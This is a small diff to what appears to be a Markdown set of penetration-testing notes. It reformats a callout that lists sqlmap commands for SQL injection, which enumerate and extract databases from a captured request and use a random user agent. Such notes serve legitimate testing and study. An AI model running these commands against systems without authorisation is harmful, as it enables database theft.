@@ -39,7 +39,7 @@ sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
 > [!danger] Step To Extraction Data
 > Extract All DataBases
 >```sql
-sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
+>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
 >```
 > Extract Current Database
 > ```sql
